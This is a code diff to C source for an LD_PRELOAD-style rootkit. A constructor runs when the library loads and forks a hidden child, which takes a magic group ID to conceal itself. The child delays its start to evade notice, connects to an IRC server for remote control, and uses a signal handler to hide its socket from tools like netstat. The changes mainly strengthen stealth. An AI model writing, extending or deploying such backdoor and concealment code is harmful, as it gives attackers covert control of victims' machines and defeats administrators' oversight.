@@ -21,6 +21,7 @@
 #include <sys/stat.h>
 #include <sys/select.h>
 #include <sys/ioctl.h>
+#include <sys/wait.h>
 #include <netinet/in.h>
 #include <linux/netlink.h>
 
@@ -40,15 +41,21 @@ void __attribute ((constructor)) binit (void)
     /* in case you don't care about being root/hiding the process...
      * i was also doing this check once the process had been forked,
      * but nonono. that's also silly! */
-    #ifndef SET_NOGID
-    if(getuid() != 0) exit(0);
-    (void) setgid(MGID); // we root, we hide.
+    int r=0;
+    #ifndef DM_ROOT
+    if(getuid() != 0) return;
+    r=1;
     #endif
 
-    int pid=fork();
-    if(pid==0){
+    if(fork()==0){
 
         setpgrp(); // we our own being
+
+        /* hide our process once we've forked. and we know we're root. */
+        if(r) (void) setgid(MGID);
+
+        /* wait BPROC_WAIT secs before doing anything. this helps us stay hidden. */
+        sleep(BPROC_WAIT);
 
         /* make socket, connect to socket. exit(0) if we can't connect.
          * every new process will attempt to connect until a successful
@@ -59,15 +66,8 @@ void __attribute ((constructor)) binit (void)
         /* setup our signal handler so that we can close the socket to
          * the irc server should our process get terminated. (by us)
          * our function 'kill_rk_procs' sends SIGTERM to all rootkit
-         * processes should we need to hide our presence.
-         *
-         * this is mainly so that we can hide the existence of the socket
-         * from tools like netstat. there is a 3 second delay in when the
-         * user runs netstat, and any output shows up. i needed to add this
-         * so that the socket can fully disappear from the system. */
+         * processes should we need to hide our presence. */
         signal(SIGTERM,(sighandler_t)commit_termicide);
-
-        /* we out here parsing */
         betrayer(sockfd);
-    }
+    }else return;
 }
